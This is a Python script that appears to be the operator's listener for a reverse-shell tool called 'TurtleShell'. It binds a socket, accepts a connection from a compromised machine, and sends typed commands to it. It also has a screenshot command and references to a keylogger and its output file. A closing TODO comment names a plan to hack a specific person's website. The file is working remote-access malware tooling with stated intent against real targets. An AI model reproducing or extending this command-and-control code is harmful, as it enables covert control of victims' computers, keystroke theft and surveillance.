#!/usr/bin/python3.10
import os
import socket
import random
import sys
import argparse
from datetime import date
import keyboard


parser = argparse.ArgumentParser(description ='Create reverse shell connection. This is a terminal version of TurtleShell')
parser.add_argument('-l','--LHOST', type=str, metavar='',required=True,help='Server Host')

parser.add_argument('-p','--PORT', type=int, metavar='',required=True,help='Port on which to listen')
args = parser.parse_args()
SEPARATOR = "<sep>"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((str(args.LHOST), args.PORT))
current_date=str(date.today())
dir='/home/samanonym/keylog_output/log.txt'
 
print("""████████╗██████╗ ██╗   ██╗████████╗██╗     ███████╗███████╗██╗  ██╗███████╗██╗     ██╗     
╚══██╔══╝██╔══██╗██║   ██║╚══██╔══╝██║     ██╔════╝██╔════╝██║  ██║██╔════╝██║     ██║     
   ██║   ██████╔╝██║   ██║   ██║   ██║     █████╗  ███████╗███████║█████╗  ██║     ██║     
   ██║   ██╔══██╗██║   ██║   ██║   ██║     ██╔══╝  ╚════██║██╔══██║██╔══╝  ██║     ██║     
   ██║   ██║  ██║╚██████╔╝   ██║   ███████╗███████╗███████║██║  ██║███████╗███████╗███████╗
   ╚═╝   ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝

                                                                                           """)

print("by samAnonym                                       ")

s.listen(5)
print(f"Listening for connection as {str(args.LHOST)}:{args.PORT}")
conn, addr=s.accept()
start = "start logger"
stop = "stop logger"
    
print(f"[+]Connected to {addr}")
    
    
while True:
    cwd = conn.recv(1024).decode()
      #print("[+]Current session:", cwd)
    cmd = input(f"{cwd}>> ")
    if not cmd.strip():
        continue

    conn.send(cmd.encode())
    if cmd.lower() == "screenshot":
        conn.send("take".encode())
    if cmd.lower() == "exit":
        break
    output = conn.recv(1024).decode()
    results = output.split(SEPARATOR)
    print(results)
 
#TODO DO SOME BUGBOUNTY, FIRST DO SOME CTFS, THEN TRY HACKING DANYLOS WEBSITE, LAST BUT NOT LEAST WORK ON THIS DAM PROGRAM
 
 
 
    
      
